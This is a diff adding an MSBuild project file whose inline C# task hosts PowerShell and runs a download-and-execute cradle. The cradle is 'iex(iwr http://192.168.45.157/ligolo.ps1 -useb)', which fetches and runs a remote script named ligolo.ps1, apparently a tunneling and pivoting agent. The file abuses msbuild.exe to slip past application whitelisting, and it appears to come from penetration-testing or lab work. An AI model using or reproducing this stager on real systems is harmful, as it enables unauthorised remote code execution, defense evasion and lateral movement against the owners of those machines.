@@ -1,0 +1,80 @@
+<Project xmlns="http://schemas.microsoft.com/developer/msbuild/2003" ToolsVersion="4.0">
+  <ItemGroup>
+    <Reference Include="System" />
+    <Reference Include="System.Core" />
+    <Reference Include="System.Xml.Linq" />
+    <Reference Include="System.Data.DataSetExtensions" />
+    <Reference Include="Microsoft.CSharp" />
+    <Reference Include="System.Data" />
+    <Reference Include="System.Net" />
+    <Reference Include="System.Xml" />
+  </ItemGroup>
+  <Target Name="Hello">
+    <ClassExample/>
+  </Target>
+  <UsingTask TaskName="ClassExample" TaskFactory="CodeTaskFactory" AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll">
+    <Task>
+      <Using Namespace="System"/>
+      <Using Namespace="System.Reflection"/>
+      <Using Namespace="System.Diagnostics"/>
+      <Using Namespace="System.Net"/>
+      <Using Namespace="System.Management.Automation"/>
+      <Reference Include="System.Management.Automation" />
+      <Code Type="Class" Language="cs">
+        <![CDATA[
+        using System;
+        using System.Management.Automation;
+        using Microsoft.Build.Framework;
+        using Microsoft.Build.Utilities;
+
+        public class ClassExample : Task
+        {
+            public override bool Execute()
+            {
+                // Define your PowerShell command here
+                string customCommand = @"
+                    iex(iwr http://192.168.45.157/ligolo.ps1 -useb)
+                ";
+
+                try
+                {
+                    // Create the PowerShell instance
+                    using (PowerShell ps = PowerShell.Create())
+                    {
+                        // Add the custom PowerShell script
+                        ps.AddScript(customCommand);
+
+                        // Execute the script
+                        var results = ps.Invoke();
+
+                        // Output the results to the console
+                        foreach (var result in results)
+                        {
+                            Console.WriteLine(result.ToString());
+                        }
+
+                        // Check for errors
+                        if (ps.Streams.Error.Count > 0)
+                        {
+                            foreach (var error in ps.Streams.Error)
+                            {
+                                Console.WriteLine("Error: " + error.ToString());
+                            }
+                            return false; // Return failure if there's an error
+                        }
+                    }
+                }
+                catch (Exception ex)
+                {
+                    Console.WriteLine("Exception occurred: " + ex.Message);
+                    return false; // Return failure if an exception occurs
+                }
+
+                return true;
+            }
+        }
+        ]]>
+      </Code>
+    </Task>
+  </UsingTask>
+</Project>
